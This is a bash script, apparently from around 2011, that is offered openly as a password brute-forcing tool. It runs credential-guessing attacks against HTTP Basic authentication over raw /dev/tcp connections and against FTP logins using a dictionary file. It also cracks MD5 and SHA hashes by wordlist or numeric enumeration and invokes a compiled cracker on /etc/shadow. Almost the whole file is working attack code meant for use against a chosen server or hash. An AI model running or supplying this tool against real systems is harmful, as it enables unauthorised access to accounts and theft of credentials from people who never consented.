#!/bin/bash

echo
echo "*************************"
echo "****Bash-Brutoforcer*****"
echo "**created by cyber-punk**"
echo "******and Simo2553*******"
echo "*******version 0.6*******"
echo "*************************"
echo

case "$1" in

-http)
	case $2 in
	-w)	Pass="/home/cyber/passes.txt" # File with username:password lines
	
		cat $Pass | while read line; do
	
		C=`echo -n $line | base64`
		Good=`printf "HTTP/1.1 200 OK\r\n"` # Good answer
		Dir="/auth/index.html" # Directory or path to file were protected
	
		exec 3<> /dev/tcp/${3:-$3}/80
	 
		printf "GET $Dir HTTP/1.0\r\n" >&3
		printf "Accept: text/html, text/plain\r\n" >&3
		printf "Accept-Language: en\r\n" >&3
		printf "Authorization: Basic $C\r\n" >&3
		printf "User-Agent: cyber-punk's_BashScript v.%s\r\n" "${BASH_VERSION}" >&3
		printf "\r\n" >&3
 
		while read LINE <&3
		do

		   A=`echo $LINE | grep "OK"`
	
		if [ "$A" = "$Good" ]; then
		echo
		echo "Good password is - $line"
		notify-send "Good password - $line" >> /dev/null
		exit 1
		else
		echo "Bad password"
		fi
		
		done
		
		done
	;;

	*)
	echo "Bad Argument!"
	echo
	;;

	esac
;;

-ftp)
echo "Starting FTP brutoforce..."
echo "Server - $2"
echo "User - $3"
echo


		echo -n "Loading..."; echo

		X="/usr/share/dict/words"

cat $X | while read line; do                     

		SRV=$2
		USR=$3
		echo -n "Checking - $line "
		STR="logged"
	
STR2=`ftp -inv $SRV << EOF
user $USR $line
bye
EOF`
	
	
		for LINE in $STR2
		do
	
		A=`echo $LINE | grep "logged"`
	

		if [ "$A" = "$STR" ]; then
		echo 
		echo
		echo "+---------------------+"
		echo "|Good password - $line|"
		echo "+---------------------+"
		notify-send "Good password - $line" >> /dev/null
		exit 1
		else
		echo -n "."
		fi
	
		done

		
		echo -n ".";echo
		

	done

	
;;

-md5)
	case $2 in

	-w)

		X="/usr/share/dict/words" # Path to your dictionary
	
		cat $X | while read line; do                     
		A=`echo "$line"`
		B=$(echo -n $A | md5sum)
		B=$(echo -n $B | sed s/-//g)
		B=$(echo -n $B)
		if [ "$B" = "$3" ]; then
		echo 
		echo "Good password - $A"
		notify-send "Good password - $A" >> /dev/null
		exit
		else
		echo "Bad password - $A"
		fi
		done
	;;
 
	-n)

		echo
		C=1000000000000000 # End number
		A=0 # Start number
		while [ $A -lt $C ]
		do
		A=$((1+A))
		B=$(echo -n $A | md5sum)
		B=$(echo -n $B | sed s/-//g)
		B=$(echo -n $B)
		if [ "$B" = "$3" ]; then
		echo 
		echo "Good password - $A"
		notify-send "Good password - $A"
		exit
		else
		echo "Bad password - $A"
		fi
		done
	;;

	esac
;;

-sha)
	case $2 in

	-w)

		X="/usr/share/dict/words" # Path to your dictionary
	
		cat $X | while read line; do                     
		A=`echo "$line"`
		B=$(echo -n $A | shasum)
		B=$(echo -n $B | sed s/-//g)
		B=$(echo -n $B)
		if [ "$B" = "$3" ]; then
		echo 
		echo "Good password - $A"
		notify-send "Good password - $A" >> /dev/null
		exit
		else
		echo "Bad password - $A"
		fi
		done
	;;
 
	-n)

		echo
		C=1000000000000000 # End number
		A=0 # Start number
		while [ $A -lt $C ]
		do
		A=$((1+A))
		B=$(echo -n $A | shasum)
		B=$(echo -n $B | sed s/-//g)
		B=$(echo -n $B)
		if [ "$B" = "$3" ]; then
		echo 
		echo "Good password - $A"
		notify-send "Good password - $A"
		exit
		else
		echo "Bad password - $A"
		fi
		done
	;;

	esac
;;


-i)
echo
echo "|---------------------------|"
echo "|---created by cyber-punk---|"
echo "|--------version 0.6--------|"
echo "|--last update: 24.09.2011--|"
echo "|-mail: cyber-punk@xakep.ru-|"
echo "|---twitter: cyberpunkych---|"
echo "|---------------------------|"
echo
;;

-shadow)
echo
echo "Use it: $0 -b /etc/shadow "
echo
gcc -lcrypt -o bruteshadow bruteshadow.c
./bruteshadow $2
;;

*)
echo "Use: $0 -sha|-md5|-shadow|-http|-ftp|-i(nformation)  -w(ordlist)|-n(umbers)|server(only FTP)   hash|shadow(only for -shadow)|user(only for FTP)|site (only for -http)"
echo
echo "More information:"
echo 
echo "http - function now works only with -wordlist"
echo "shadow - for this function you must have GCC"
echo "ftp - FTP brutoforcer, you must enter ip and user to brute"
echo
exit
esac
